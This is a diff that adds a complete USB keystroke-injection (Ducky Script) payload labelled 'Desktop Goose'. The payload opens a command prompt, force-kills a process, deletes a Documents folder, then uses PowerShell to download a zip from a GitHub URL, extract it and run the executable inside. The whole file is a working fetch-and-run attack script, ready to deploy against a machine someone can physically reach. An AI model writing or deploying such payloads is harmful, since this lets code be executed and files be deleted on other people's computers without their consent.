@@ -1,0 +1,28 @@
+REM Author: [LONG]
+REM Version: [1.0]
+REM Decription: Desktop Goose.
+DELAY 1000
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 1000
+ENTER
+DELAY 1000
+STRING taskkill /f /im goosedesktop.exe
+DELAY 300
+ENTER
+REM Del Dir if already exists.
+STRING cd / && cd %USERPROFILE%\documents && If EXIST %USERPROFILE%\documents\Goose rmdir %USERPROFILE%\documents\Goose /S /Q
+DELAY 300
+ENTER
+REM Makes new Dir 
+STRING mkdir Goose & cd Goose
+ENTER
+DELAY 300
+STRING Powershell
+DELAY 800
+ENTER
+REM Gets files from git repo.
+STRING Invoke-WebRequest 'https://github.com/LONG-BAT/Desktop-Goose-DUCKY/raw/main/DG.zip' -OutFile ./DG.zip; Expand-Archive .\DG.zip .\; Start-Process -FilePath "DG_original.exe"
+DELAY 250
+ENTER
